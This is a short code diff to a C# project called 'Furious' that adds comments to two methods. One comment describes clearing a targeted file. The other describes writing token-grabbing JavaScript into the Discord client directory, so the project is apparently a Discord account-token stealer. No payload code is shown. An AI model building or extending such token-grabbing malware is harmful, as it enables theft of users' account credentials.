@@ -44,6 +44,7 @@ namespace Furious
 
 		internal static async Task CleanFile(string path)
 		{
+			///Clears the targeted file of its contents.
 			try
 			{
 				using (StreamWriter streamWriter = new StreamWriter(path))
@@ -59,6 +60,7 @@ namespace Furious
 
 		internal static async Task WriteDiscord(string path)
 		{
+			///Writes the token grabbing JavaScript code into the Discord directory.
 			if (File.Exists(FileManagement.DiscordPath))
 			{
 				try
